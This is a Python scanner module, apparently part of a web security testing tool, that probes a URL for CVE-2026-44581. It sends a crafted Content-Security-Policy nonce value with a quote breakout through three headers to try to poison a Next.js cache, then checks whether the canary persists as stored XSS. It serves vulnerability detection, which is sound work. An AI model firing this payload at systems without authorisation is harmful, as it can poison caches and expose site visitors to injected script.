#!/usr/bin/env python3
"""
CVE-2026-44581
https://www.sentinelone.com/vulnerability-database/cve-2026-44581/
https://github.com/advisories/GHSA-ffhc-5mcf-pf4q
"""

import secrets

from utils.style import Colors, Identify
from utils.utils import configure_logger, requests

logger = configure_logger(__name__)

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
)


POISON_HEADER_NAMES = [
    "Content-Security-Policy",
    "Content-Security-Policy-Report-Only",
    "X-Nonce",
]


SKIP_STATUS_CODES = {403, 429}

POISON_ATTEMPTS = 6
POISON_REPEAT = 2


def build_payload(canary: str) -> str:
    """Valeur CSP empoisonnée, identique pour les trois vecteurs."""
    return f"script-src 'nonce-\"{canary}//'"


def reflection_level(body: str, canary: str) -> str | None:

    if not body or canary not in body:
        return None
    if f'"{canary}' in body:
        return "breakout"
    return "reflected"


def _get(uri, s, authent, headers=None):
    return s.get(
        uri,
        headers=headers,
        verify=False,
        auth=authent,
        allow_redirects=True,
        timeout=15,
    )


def _probe_variant(
    url: str,
    header_name: str,
    s: requests.Session,
    authent: tuple[str, str] | None,
) -> bool:


    canary = f"hexhttp{secrets.token_hex(5)}"
    payload = build_payload(canary)
    poison_headers = {"User-Agent": DEFAULT_USER_AGENT, header_name: payload}
    sep = "&" if "?" in url else "?"

    for _ in range(POISON_ATTEMPTS):
        uri = f"{url}{sep}cb={secrets.token_hex(6)}"

        last_poison = None
        try:
            for _ in range(POISON_REPEAT):
                last_poison = _get(uri, s, authent, headers=poison_headers)
        except requests.exceptions.RequestException as e:
            logger.error("poison failed %s (%s): %s", uri, header_name, e)
            continue

        if last_poison is None or last_poison.status_code in SKIP_STATUS_CODES:
            continue

        poison_level = reflection_level(last_poison.text, canary)
        if poison_level is None:
            continue

        tag = (
            "BREAKOUT (stored XSS)"
            if poison_level == "breakout"
            else "reflected (escaped)"
        )
        print(
            f" {Identify.behavior} | CVE-2026-44581"
            f" | {Colors.BLUE}{uri}{Colors.RESET}"
            f" | PAYLOAD: {header_name}: {payload}"
        )
        try:
            verify = _get(uri, s, authent)
        except requests.exceptions.RequestException as e:
            logger.error("verify failed %s (%s): %s", uri, header_name, e)
            return True

        if reflection_level(verify.text, canary) is not None:
            print(
                f" {Identify.confirmed} | CVE-2026-44581"
                f" | {Colors.BLUE}{uri}{Colors.RESET}"
                 f" | PAYLOAD: {header_name}: {payload}"
            )
        else:
            print(
                " └─ [i] CVE-2026-44581 | Nonce reflected but not poisoned, verify manualy"
            )
        return True

    return False


def nextjs_csp_nonce(
    url: str,
    s: requests.Session,
    req_main: requests.Response | None = None,
    authent: tuple[str, str] | None = None,
) -> bool:

    detected = False
    try:
        for header_name in POISON_HEADER_NAMES:
            if _probe_variant(url, header_name, s, authent):
                detected = True
    except requests.exceptions.Timeout:
        logger.error("request timeout %s", url)
    except requests.exceptions.ConnectionError as e:
        logger.error("connection error %s: %s", url, e)
    except Exception as e:
        logger.error("error testing CVE-2026-44581 %s: %s", url, e)

    return detected


if __name__ == "__main__":
    import sys
    from utils.utils import urlparse

    if len(sys.argv) != 2:
        print("Usage: python CVE202644581.py <URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    parsed = urlparse(target_url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        print("Error: invalid URL. Must start with http:// or https://")
        sys.exit(1)

    with requests.Session() as sess:
        sess.headers.update({"User-Agent": DEFAULT_USER_AGENT})
        try:
            nextjs_csp_nonce(target_url, sess)
        except KeyboardInterrupt:
            print("\nExiting")
            sys.exit(0)
